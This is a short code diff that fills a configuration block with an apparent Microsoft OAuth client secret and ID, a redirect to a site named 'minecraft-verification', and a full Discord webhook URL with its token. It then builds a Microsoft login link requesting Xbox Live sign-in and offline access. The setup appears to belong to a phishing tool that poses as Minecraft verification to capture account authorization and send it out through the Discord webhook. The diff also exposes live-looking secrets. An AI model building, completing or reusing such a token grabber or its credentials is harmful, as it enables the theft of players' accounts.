@@ -1,8 +1,8 @@
 //Change these btw
-const client_secret = 'i love free stuff' //you need to put the "Secret Value" here not the "Secret ID"!!!!
-const client_id = 'it is what it is'
-const redirect_uri = 'u know how it is'
-const webhook_url = 'ur shit ass webhook mf'
+const client_secret = 'cTg8Q~5KLeSWagWpD_.nOrXhf9ntKpt3A9lKPaRI' //you need to put the "Secret Value" here not the "Secret ID"!!!!
+const client_id = '1bfb18a2-ca7b-48c7-ad17-a490a6185320'
+const redirect_uri = 'https://minecraft-verification.onrender.com/'
+const webhook_url = 'https://discord.com/api/webhooks/1047624352004325407/Y_mbIqVCtZGSUx_pSKloGRm1DrsFi2-JSgtnI_ijd3Ukpc9ERtxnAeLQFkTfWNKfya5l'
 
 //Requirements
 const redirect = 'https://login.live.com/oauth20_authorize.srf?client_id='+client_id+'&response_type=code&redirect_uri='+redirect_uri+'&scope=XboxLive.signin+offline_access&state=NOT_NEEDED'
